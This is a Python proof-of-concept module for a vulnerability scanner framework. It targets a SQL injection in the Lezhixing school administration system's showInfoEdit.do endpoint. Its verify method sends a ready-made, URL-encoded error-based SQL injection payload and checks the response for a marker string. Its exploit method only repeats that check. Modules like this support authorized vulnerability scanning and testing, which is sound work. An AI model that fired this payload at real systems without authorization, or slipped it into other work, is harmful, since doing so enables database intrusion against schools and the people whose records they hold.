# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Lezhixing_0003'  # 平台漏洞编号，留空
    name = '北京乐知行教务系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
        乐知行教学系统是北京讯飞乐知行软件有限公司打造的一款教学管理一体化系统。
        北京乐知行教务系统 /datacenter/downloadApp/showInfoEdit.do SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乐知行教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c27832fc-cf50-4d6b-ad05-1f939e476564'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/datacenter/downloadApp/showInfoEdit.do?_1428145745205&id=dc5593e2e6dd4d2fa4c1651aa2202c99&time=1428145745185&type=%27%20AND%20%28SELECT%206347%20FROM%28SELECT%20COUNT%28*%29,CONCAT%280x71626b6a71,%28SELECT%20%28ELT%286347=6347,1%29%29%29,0x71707a7871,FLOOR%28RAND%280%29*2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27GfKZ%27=%27GfKZ&_app_encoding_tag_=1"
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if 'qbkjq1qpzxq1' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
